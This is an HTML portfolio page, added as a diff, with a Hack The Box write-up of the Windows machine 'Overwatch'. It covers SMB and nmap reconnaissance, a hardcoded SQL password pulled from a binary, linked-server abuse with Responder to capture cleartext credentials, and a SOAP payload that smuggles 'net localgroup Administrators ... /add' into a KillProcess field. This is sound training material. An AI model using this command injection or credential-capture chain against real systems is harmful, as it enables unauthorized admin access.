@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Overwatch Writeup | Koussay Aydi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">← Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Windows Medium</span>
+            <h1>Overwatch Writeup</h1>
+            <p><strong>Author:</strong> atrox | <strong>Tags:</strong> Active Directory, WCF, MSSQL, PetitPotam</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Overview</h2>
+            <p>Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.</p>
+
+            <h2>Reconnaissance</h2>
+            <h3>Nmap</h3>
+            <pre><code>nmap -sV 10.129.16.26 -vvv</code></pre>
+            <table>
+                <thead><tr><th>Port</th><th>Service</th></tr></thead>
+                <tbody>
+                    <tr><td>53</td><td>DNS</td></tr>
+                    <tr><td>88</td><td>Kerberos</td></tr>
+                    <tr><td>445</td><td>SMB</td></tr>
+                    <tr><td>3389</td><td>RDP</td></tr>
+                </tbody>
+            </table>
+
+            <h2>Enumeration</h2>
+            <h3>Credentials in the Binary</h3>
+            <p>Running <code>strings</code> against <code>overwatch.exe</code> reveals a hardcoded SQL connection string:</p>
+            <pre><code>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</code></pre>
+
+            <h2>Lateral Movement — Linked Server Abuse</h2>
+            <p>By querying a linked server named <strong>SQL07</strong> and spoofing DNS, we can capture cleartext credentials using Responder:</p>
+            <pre><code>[MSSQL] Cleartext Username : sqlmgmt
+[MSSQL] Cleartext Password : bIhBbzMMnB82yx</code></pre>
+
+            <h2>Privilege Escalation — WCF SOAP Injection</h2>
+            <p>The WCF service exposes a <code>KillProcess</code> method vulnerable to command injection. We can use this to add our user to the local Administrators group:</p>
+            <pre><code># PowerShell SOAP Injection Payload
+&lt;KillProcess xmlns='http://tempuri.org/'&gt;
+    &lt;processName&gt;notepad; net localgroup Administrators sqlmgmt /add&lt;/processName&gt;
+&lt;/KillProcess&gt;</code></pre>
+
+            <div class="hero-meta" style="margin-top: 40px;">
+                <span>Attack Chain:</span>
+                <code>SMB → SQL Creds → Linked Server Abuse → WinRM → WCF Injection → SYSTEM</code>
+            </div>
+            
+            <div style="margin-top: 50px;">
+                <a href="index.html" class="btn btn-primary">Return Home</a>
+            </div>
+        </article>
+    </main>
+</body>
+</html>
